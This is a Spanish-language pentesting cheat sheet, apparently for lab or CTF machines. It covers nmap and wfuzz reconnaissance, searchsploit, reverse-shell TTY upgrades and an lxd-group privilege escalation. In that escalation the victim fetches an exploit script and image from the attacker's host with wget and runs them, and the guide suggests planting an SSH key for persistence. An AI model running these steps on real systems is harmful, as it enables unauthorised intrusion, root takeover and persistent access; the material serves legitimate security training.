# La guía del explorador de seguridad en sistemas de información

En todos los siguientes comandos se asume que se ejecutan desde el usuario root con permisos de superusuario. Para acceder a él:

```bash
sudo su
```

Además nos referiremos a la ip de la maquina víctima de la manera `ipV` y a la de nuestra máquina como `ipH`.

# Fase de reconocimiento
En primer lugar debemos comprobar que exixte conexión entre nuestra máquina y la máquina atacada.

```bash
ping -c 1 <ipV>
```

En este punto ya podremos detectar de si la máquina víctima se trata de una máquina Linux (Si el TTL es menor y próximo a **64**) o Windows (Si el TTL es menor y próximo a **128**).

También es posible utilizar la utilidad `wichSystem.py`, la cual se puede incluir en el $PATH, que reportará por consola el tipo sistema de manera más limpia.

```bash
wichSystem.py <ipV>
```

## Nmap

Procedemos a la fase de reconocimiento de puertos para saber que servicios tiene expuestos la máquina y poder detectar posibles agujeros de seguridad.

```bash
nmap -p- --open -T5 -v -n <ipV>
```

+ -p-: Indica todo el rango de puertos (0-65535).
+ --open: Para que solo nos reporte aquellos que tienen un estado abierto.
+ -T: Con el parámetro -T controlamos el temporizado y rendimiento de el escaneo, puede tomar valores de 0 a 5, donde 5 es más rápido y también más ruidoso.
+ -v: Para que nos vaya reportando información por consola con el progreso del escaneo.
+ -n: Para que no aplique resolución DNS.

Si el escaneo resulta tedioso, podemos emplear el siguiente, aunque será muy ruidoso:

```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn <ipV> -oG allPorts
```

+ -sS: Se trata de un TCP SYN port scan.
+ --min-rate: Enviará paquetes no más lento que lo que se  le indique.
+ -vvv: Más verboso.
+ -Pn: Evitamos host discovery mediante el protocolo ARP.
+ -oG: Exportamos la captura a un archivo en formato grepeable. (Tambien se podría exportar a otros formatos -oA: All formats. -oX: Modo XML -oN: Modo nmap).

Ahora aplicamos la función extractPorts a la capruta de nmap de manera que se nos mostrará por pantalla de una forma mucho más limpia, además de copiarnos los puertos al portapapeles. Nota: Es necesario tener instalado `xclip` además de `batcat`.

```bash
extractPorts allPorts
```

A continuación le lanzaremos un serie de scripts básicos de numeración para tratar de detectar la versión y servicio que corren para los puertos obtenidos y lo exportará en formato Nmap al archivo targeted.

```bash
nmap -sC -sV -p<p1>,<p2>,<p3> <ipV> -oN targeted
```

Si uno de estos servicios se trata de http, podemos lanzar el script whatweb para detectar el gestor de contenidos que está utilizando el servidor web.

```bash
whatweb http://<ipV>:<p>
```

Para descubrir posibles rutas dentro de la aplicación web podemos utilizar:
```bash
nmap --script http-enum -p<p> <ipV> -oN webScan
```

Para descubrir subdominios dentr de la aplicación web podemos utilizar:
```bash
wfuzz -c --hc404 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-11000.txt -H "Host: FUZZ.<domain>" http://<domain>
```

# SploitDB
Para buscar un sploit:

```bash
searchsploit <Nombre del servicio>
```

Para moverlo a tu directorio actual:

```bash
searchsploit -m <Número identificativo>
```
Por último quedaría entrar en el, introducir los valores requeridos y ejecutarlo.

# Tratamiento de la TTY
Al conseguir conectarnos a a una máquina a través de una reverse shell, esta no es del todo funcional, ya que algunos atajos como podrían ser Ctrl + C no los podríamos utilizar. Para solucionarlo:

```bash
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset
```
Terminal type? 
```bash
xterm
```

```bash
export TERM=xterm
export SHELL=bash
```

Por último debemos cambiar el número de filas y columnas. Previamente en una terminal de nuestro equipo ejecutamos:

```bash
stty size
```

Y copìamos el número de filas y columnas. Ahora en la terminal de la víctima podemos introducirlas mediante:

```bash
stty rows <nº filas> columns <nº columnas>
```

# Escalado de privilegios

Podemos ver en que grupos se encuentra el usuario mediante:
```bash
id
```

También si es posible ejecutar algún comando como superusuario
```bash
sudo -l
```

Buscamos privilegios suid en el directorio raíz /
```bash
find \-perm -4000 2>/dev/null
```

También podemos ver si nos encontramos dentro de un contenedor o no 
```bash
hostname -I
```


## Si pertenencia a docker o lxd:

Debemos averiguar si estamos en una máquina de 32 o 64 bits:
```bash
uname -a
```

Ahora en nuestra máquina de atacante debemos obtener el sploit y un fichero .tar.gz de alpine.

```bash
searchsploit lxd
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
chmod +x build-alpine
./build-alpine [-a i686]
```
Este ultimo parámetro solo si nos encontramos ante una máquina de 32 bits.

```bash
searchsploit -m 46978
chmod +x 46978.sh
dos2unix 46978.sh
```

En la máquina atacante:
```bash
python3 -m http.server 80
```
Y en la máquina víctima:
```bash
wget http://<ipH>/alpine....tar.gz
wget http://<ipH>/46978.sh
chmod +x 46978.sh

./46978.sh -f alpine....tar.gz
```

Si el comando da un error como que requiere privilegios de root, debemos entrar al fichero:
```bash
vim 46978.sh
```
Eliminar la linea `lxc image import $filename --alias alpine && lxd init --auto` y volver a ejecutar el script.

```bash
./46978.sh -f alpine....tar.gz
```

```bash
cd /mnt/root/
```
Y este sería el directorio root de la maquina víctima. Aquí se podría añadir una id_rsa para ssh.
